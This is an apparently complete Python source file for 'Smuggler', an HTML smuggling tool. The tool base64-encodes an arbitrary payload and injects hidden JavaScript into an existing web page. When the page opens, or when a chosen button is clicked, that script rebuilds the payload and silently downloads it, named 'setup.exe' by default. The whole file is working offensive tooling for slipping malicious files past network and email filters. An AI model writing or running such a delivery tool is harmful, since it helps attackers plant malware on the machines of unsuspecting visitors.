import base64
import argparse
from bs4 import BeautifulSoup

HELP_STRING = """
        Smuggler
        Smuggle payloads in HTML files.
        """

def create_javascript(data, fileName, button):
    print(button)
    if button is not None:
        return f"""
        function clickToDownload() {{
            const data = window.atob("{data}")
            const fileName = "{fileName}"

            const blob = new Blob([data], {{type: 'octet/stream'}})

            const a = document.createElement('a')
            document.body.appendChild(a)
            a.style = 'display: none'
            const url = window.URL.createObjectURL(blob)
            a.href = url;
            a.download = "{fileName}"
            a.click()
            window.URL.revokeObjectURL(url)
        }}
    """
    else:
        return f"""
            const data = window.atob("{data}")
            const fileName = "{fileName}"

            const blob = new Blob([data], {{type: 'octet/stream'}})

            const a = document.createElement('a')
            document.body.appendChild(a)
            a.style = 'display: none'
            const url = window.URL.createObjectURL(blob)
            a.href = url;
            a.download = "{fileName}"
            setTimeout(() => {{a.click()}}, "3000")
            window.URL.revokeObjectURL(url)
        """

def main(flags):

    with open(flags.htmlfile, "r", encoding="utf-8") as original_file:
        html_content = original_file.read()

    with open(f"{flags.payload}", "rb") as payload_file:
        binary_data = payload_file.read()
        encoded_data = base64.b64encode(binary_data).decode()

    soup = BeautifulSoup(html_content, "html.parser")
    new_script = soup.new_tag("script")

    if flags.downloadtagid:
        tag_id = flags.downloadtagid.strip()
        download_tag = soup.findAll(attrs={"id": tag_id})
        for tag in download_tag:
            tag["onClick"] = "clickToDownload()"
        new_script.string = create_javascript(encoded_data, flags.downloadname, tag_id)
    else:
        new_script.string = create_javascript(encoded_data, flags.downloadname, None)

    soup.body.append(new_script)

    with open("modified_index.html", "w", encoding="utf-8") as new_file:
        new_file.write(str(soup.prettify()))

    input()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog="Smuggler",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description= HELP_STRING
    )

    # Mandatory
    parser.add_argument("-p","--payload", help="The payload to embed in the html.", required=True)
    parser.add_argument("-hf","--htmlfile", help="The html file to embed into.", required=True)

    # Optional
    parser.add_argument("-dn","--downloadname", default="setup.exe", help="The name of the file when downloaded")
    parser.add_argument("-did","--downloadtagid", help="The id of the button to click to download file.")

    argparse_args = parser.parse_args()

    main(argparse_args)
else:
    from .args import Smuggler_Args
    def smuggler():
        args = Smuggler_Args()

        main(args)
